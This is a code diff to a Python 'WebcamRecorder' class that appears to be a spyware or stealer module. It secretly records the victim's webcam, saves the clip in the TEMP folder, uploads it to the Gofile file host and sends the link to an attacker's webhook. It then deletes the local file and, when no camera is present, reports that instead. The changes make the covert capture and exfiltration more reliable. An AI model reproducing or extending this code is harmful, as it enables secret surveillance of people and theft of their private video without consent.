@@ -3,7 +3,7 @@ import os, cv2, requests, time, gofile2, datetime
 class WebcamRecorder():
     def __init__(self):
         self.webhook = "WEBHOOK_HERE"
-        self.filename = 'video.avi'
+        self.filename = 'video.mp4'
 
         self.Recorder()
 
@@ -25,21 +25,27 @@ class WebcamRecorder():
         return width, height
 
     def Recorder(self):
+        temp = os.path.join(f"{os.getenv('TEMP')}\\{self.filename}")
         res = '720p'
         t_end = time.time() + 2 #change this to the amount of time you want to record
+
         cap = cv2.VideoCapture(0)
-        out = cv2.VideoWriter(self.filename, cv2.VideoWriter_fourcc(*'XVID'), 25, self.get_dims(cap, res))
-        while time.time() < t_end:
-            ret, frame = cap.read()
-            out.write(frame)
-        cap.release()
-        out.release()
-        cv2.destroyAllWindows()
-        g_a = gofile2.Gofile()
-        videoUrl = g_a.upload(file=f'{os.getcwd()}\\{self.filename}')
-        self.webcam = f"**Webcam Video: [{videoUrl['downloadPage']}]({videoUrl['downloadPage']})**"
-        os.remove(os.getcwd()+"\\"+self.filename)
-        self.WebhookSender(self.webcam)
+        if cap.isOpened():
+            out = cv2.VideoWriter(temp, cv2.VideoWriter_fourcc(*'X264'), 25, self.get_dims(cap, res))
+            while time.time() < t_end:
+                ret, frame = cap.read()
+                out.write(frame)
+            cap.release()
+            out.release()
+            cv2.destroyAllWindows()
+            g_a = gofile2.Gofile()
+            videoUrl = g_a.upload(file=temp)
+            self.webcam = f"**Webcam: [{videoUrl['downloadPage']}]({videoUrl['downloadPage']})**"
+            os.remove(temp)
+            self.WebhookSender(self.webcam)
+        else:
+            self.webcam = "**No Webcam found**"
+            self.WebhookSender(self.webcam)
 
     def WebhookSender(self, webcam):
         today = datetime.date.today()
